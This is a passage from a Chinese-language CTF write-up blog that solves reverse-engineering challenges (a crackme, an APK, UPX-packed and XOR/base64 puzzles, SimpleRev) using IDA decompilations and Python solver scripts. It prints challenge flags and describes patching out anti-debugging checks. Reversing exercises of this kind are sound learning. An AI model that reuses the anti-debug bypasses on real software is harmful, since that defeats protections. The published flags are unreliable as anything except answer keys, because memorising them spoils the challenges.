edx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *key == <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">4u</span>;</span><br><span class="line">    v4 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 ^= <span class="number">3u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">1</span>] == <span class="number">98</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _EAX = a3;</span><br><span class="line">    *a3 |= <span class="number">0x14</span>u;</span><br><span class="line">    v6 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0x61</span>u;</span><br><span class="line">    _EAX = (_DWORD *)*a3;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; aam &#125;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">2</span>] == <span class="number">97</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x84</span>u;</span><br><span class="line">    v9 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0xA</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = *a3;</span><br><span class="line">  v10 = ~(a1 &gt;&gt; <span class="number">-91</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">3</span>] == <span class="number">112</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x114</span>u;</span><br><span class="line">    v12 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &gt;&gt;= <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = *a3;</span><br><span class="line">  v13 = v10 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">4</span>] == <span class="number">112</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x380</span>u;</span><br><span class="line">    v15 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 *= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">24</span>) + <span class="number">12</span>) != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[<span class="number">5</span>] == <span class="number">102</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *a3 |= <span class="number">0x2DC</span>u;</span><br><span class="line">      v17 = *a3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *a3 |= <span class="number">0x21</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">5</span>] == <span class="number">115</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0xA04</span>u;</span><br><span class="line">    v18 = (<span class="keyword">char</span>)a3;</span><br><span class="line">    v20 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">char</span>)a3;</span><br><span class="line">    *a3 ^= <span class="number">0x1AD</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = *a3;</span><br><span class="line">  _AL = v18 - v13;</span><br><span class="line">  __asm &#123; daa &#125;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">6</span>] == <span class="number">101</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x2310</span>u;</span><br><span class="line">    v24 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x4A</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">7</span>] == <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a3;</span><br><span class="line">    *a3 |= <span class="number">0x8A10</span>u;</span><br><span class="line">    v26 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0x3A3</span>u;</span><br><span class="line">    result = (_DWORD *)*a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由分析可知,key应该为:<code>key = [100, 98, 97, 112, 112, 115, 101, 99]</code>,即<code>dbappsec</code>（本来key[5]可能值为115或102但前面由做过以dbappsec为密钥的题,便猜测为dbappsec）</p><p>接着,根据调试可知,xor函数是将key和user每位对应异或。</p><p>接着在调试中将box参与异或的位数提取出来,即可,但解出来本地输入就错误,故猜测下面这两处地方将异或操作进行了类似于反调试的操作,故将这两处直接nop掉</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">104</span>) &amp; <span class="number">0x70</span> )</span><br><span class="line">      v12 = v10 + v11;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">2</span>) &amp; <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-83</span>;</span><br><span class="line">      v11 = <span class="number">43</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终得到解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">100</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,key))</span><br><span class="line">xor = [<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>]</span><br><span class="line"></span><br><span class="line">user = <span class="string">&quot;welcomebeijing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] ^= <span class="built_in">ord</span>(user[i])</span><br><span class="line">    key[i] ^= xor[i]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(key[i])[<span class="number">2</span>:]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到:<code>39d09ffa4cfcc4cc</code></p><p>本地输入不会出现<code>Please try again</code>则猜测通过,但md532位小写hash加密后提交却不对,陷入自闭。</p><p>后用cmd打开crackMe.exe发现<code>39d09ffa4cfcc4cc</code>是错误的！</p><p>故用cmd直接打开,用IDA attach上去调试,xor数组不变但原程序中xor函数中不执行异或操作,实际毫无效果。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190709205034.png" alt="xor"></p><p>因为调试直接跳过,就没有注意到下面会因为窗口的不同而不同,还是tcl…..</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">StartupInfo.dwX</span><br><span class="line">    || StartupInfo.dwY</span><br><span class="line">    || StartupInfo.dwXCountChars</span><br><span class="line">    || StartupInfo.dwYCountChars</span><br><span class="line">    || StartupInfo.dwFillAttribute</span><br><span class="line">    || StartupInfo.dwXSize</span><br><span class="line">    || StartupInfo.dwYSize</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终解密脚本为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">100</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,key))</span><br><span class="line">xor = [<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>]</span><br><span class="line"></span><br><span class="line">user = <span class="string">&quot;welcomebeijing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] ^= xor[i]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(key[i])[<span class="number">2</span>:]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到第二个密码<code>4EB5F3992391A1AE</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user(6-16 letters or numbers):welcomebeijing</span><br><span class="line">password(6-16 letters or numbers):4EB5F3992391A1AE</span><br><span class="line">Congratulations:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后进行md5加密后提交,得正确flag:</p><p>flag{d2be2981b84f2a905669995873d6a36c}</p><h3 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h3><p>下载下来是个apk文件,就直接jeb打开,根据字符串找到主要函数:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg8)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg8);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F030018</span>);</span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F05003D</span>).setOnClickListener(<span class="keyword">new</span> View$OnClickListener(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;, <span class="keyword">this</span>.findViewById(<span class="number">0x7F05003E</span>), <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;, <span class="keyword">this</span>.findViewById(<span class="number">0x7F05003F</span>)) &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg13)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> v11 = <span class="number">17</span>;</span><br><span class="line">                <span class="keyword">int</span> v10 = <span class="number">0x7A</span>;</span><br><span class="line">                <span class="keyword">int</span> v9 = <span class="number">90</span>;</span><br><span class="line">                <span class="keyword">int</span> v8 = <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">int</span> v7 = <span class="number">97</span>;</span><br><span class="line">                <span class="keyword">char</span>[] v3 = <span class="keyword">new</span> <span class="keyword">char</span>[v11];</span><br><span class="line">                <span class="keyword">char</span>[] v4 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">int</span> v0;</span><br><span class="line">                <span class="keyword">for</span>(v0 = <span class="number">0</span>; v0 &lt; v11; ++v0) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">this</span>.val$a[v0] &gt;= <span class="number">73</span> || <span class="keyword">this</span>.val$a[v0] &lt; v8) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">this</span>.val$a[v0] &lt; <span class="number">105</span> &amp;&amp; <span class="keyword">this</span>.val$a[v0] &gt;= v7) &#123;</span><br><span class="line">                        label_39:</span><br><span class="line">                            v3[v0] = ((<span class="keyword">char</span>)(<span class="keyword">this</span>.val$a[v0] + <span class="number">18</span>));</span><br><span class="line">                            goto label_44;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">this</span>.val$a[v0] &gt;= v8 &amp;&amp; <span class="keyword">this</span>.val$a[v0] &lt;= v9 || <span class="keyword">this</span>.val$a[v0] &gt;= v7 &amp;&amp; <span class="keyword">this</span>.val$a[v0] &lt;= v10) &#123;</span><br><span class="line">                            v3[v0] = ((<span class="keyword">char</span>)(<span class="keyword">this</span>.val$a[v0] - <span class="number">8</span>));</span><br><span class="line">                            goto label_44;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        v3[v0] = <span class="keyword">this</span>.val$a[v0];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        goto label_39;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                label_44:</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(String.valueOf(v3).equals(<span class="keyword">this</span>.val$edit.getText().toString())) &#123;</span><br><span class="line">                    v0 = <span class="number">0</span>;</span><br><span class="line">                    goto label_18;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.val$text.setText(<span class="string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                label_18:</span><br><span class="line">                    <span class="keyword">while</span>(v0 &lt; <span class="number">38</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">this</span>.val$b[v0] &lt; v8 || <span class="keyword">this</span>.val$b[v0] &gt; v9) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">this</span>.val$b[v0] &gt;= v7 &amp;&amp; <span class="keyword">this</span>.val$b[v0] &lt;= v10) &#123;</span><br><span class="line">                            label_80:</span><br><span class="line">                                v4[v0] = ((<span class="keyword">char</span>)(<span class="keyword">this</span>.val$b[v0] + <span class="number">16</span>));</span><br><span class="line">                                <span class="keyword">if</span>((v4[v0] &lt;= v9 || v4[v0] &gt;= v7) &amp;&amp; v4[v0] &lt; v10) &#123;</span><br><span class="line">                                    goto label_95;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                v4[v0] = ((<span class="keyword">char</span>)(v4[v0] - <span class="number">26</span>));</span><br><span class="line">                                goto label_95;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            v4[v0] = <span class="keyword">this</span>.val$b[v0];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            goto label_80;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    label_95:</span><br><span class="line">                        ++v0;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.val$text.setText(String.valueOf(v4));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察后发现解题方法有2:</p><p>1.逆推出输入</p><p>2.复现flag生成过程</p><p>我这里采用第2种,脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;&quot;</span></span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">ord</span>,flag)</span><br><span class="line"></span><br><span class="line">v11 = <span class="number">17</span></span><br><span class="line">v10 = <span class="number">0x7A</span></span><br><span class="line">v9 = <span class="number">90</span></span><br><span class="line">v8 = <span class="number">65</span></span><br><span class="line">v7 = <span class="number">97</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> flag[i] &lt; v8 <span class="keyword">or</span> flag[i] &gt; v9:</span><br><span class="line">        <span class="keyword">if</span> flag[i] &gt;= v7 <span class="keyword">and</span> flag[i] &lt;= v10 :</span><br><span class="line">            flag[i] += <span class="number">16</span></span><br><span class="line">            <span class="keyword">if</span> (flag[i] &lt;= v9 <span class="keyword">or</span> flag[i] &gt;= v7) <span class="keyword">and</span> flag[i] &lt; v10:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag[i] = flag[i] - <span class="number">26</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag[i] += <span class="number">16</span></span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= v9 <span class="keyword">or</span> flag[i] &gt;= v7) <span class="keyword">and</span> flag[i] &lt; v10:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        flag[i] = flag[i] - <span class="number">26</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得flag:<br>flag{c164675262033b4c49bdf7f9cda28a75}</p><h3 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h3><p>IDA打开, UPX壳, 官方工具直接脱</p><p>重新打开,直接能看到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/xnkl-main.jpg" alt="xnkl-main"></p><p>得flag:</p><p>flag{HappyNewYear!}</p><h3 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h3><p>IDA打开直接看到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/reverse3-main.jpg" alt="reverse3-main"></p><p>得flag:</p><p>flag{49d3c93df25caad81232130f3d2ebfad}</p><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>IDA打开,简单的异或题</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/xor-main.jpg" alt="xor-main"></p><p>python脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x66</span>, <span class="number">0x0A</span>, <span class="number">0x6B</span>, <span class="number">0x0C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x55</span>, <span class="number">0x11</span>, <span class="number">0x70</span>, <span class="number">0x19</span>, <span class="number">0x46</span>, <span class="number">0x1F</span>, <span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x23</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x68</span>, <span class="number">0x0F</span>, <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x4F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    s[i + <span class="number">1</span>] ^= s[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,s)))</span><br></pre></td></tr></table></figure><p>得到flag:</p><p>flag{QianQiuWanDai_YiTongJiangHu}</p><h3 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h3><p>IDA打开简单的加密</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/reverse3-main.jpg" alt="reverse3-main"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="built_in">bytearray</span>(<span class="string">b&quot;e3nifIH9b_C@n@dH&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[i] -= i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(s))</span><br></pre></td></tr></table></figure><p>得到flag:</p><p>flag{i_l0ve_you}</p><h3 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h3><p>WSL子系统运行不了,<code>file</code> 一下是<code>ELF 64-bit LSB</code>程序</p><p>IDA打开,主要逻辑如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Decry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)src = <span class="string">&#x27;SLCDN&#x27;</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="string">&#x27;wodah&#x27;</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  text = join(key3, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v9); <span class="comment">// join函数的作用是拼接 最终text=&#x27;killshadow&#x27;</span></span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1); <span class="comment">// 把key1 &#x27;ADSFK&#x27; 复制到key</span></span><br><span class="line">  <span class="built_in">strcat</span>(key, src); <span class="comment">// 把&#x27;SLCDN&#x27;反着接到后面 最后key=&#x27;ADSFKNDCLS&#x27;</span></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// key大写变小写</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>, src);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="string">&#x27;`&#x27;</span> || v1 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; v1 &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 这部分可以之间爆</span></span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3++ % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3++ % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="built_in">bytearray</span>(<span class="string">b&quot;killshadow&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytearray</span>(<span class="string">b&quot;ADSFKNDCLS&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    c = 